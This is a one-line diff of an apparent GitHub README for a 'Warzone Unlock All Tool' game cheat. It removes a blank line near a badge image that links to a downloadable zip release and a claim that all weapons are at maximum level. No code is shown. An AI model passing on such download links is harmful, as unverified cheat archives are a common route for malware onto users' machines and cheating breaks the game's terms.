@@ -4,7 +4,6 @@
 
 [![image](https://github.com/user-attachments/assets/33ca32ba-6d5c-4f35-a66a-75792ae84403)](https://github.com/spree-serve-entity/warzone-unlock-all-tool/releases/download/latest/Warzone.Unlock.All.Tool.zip)
 
-
 # ⚙Functions⚙ ![hghhg](https://img.shields.io/badge/Settings-%23d81d7b)
 
 ![](https://img.shields.io/badge/%E2%98%91-%2328e244) All Weapons are on Maximum Level. 
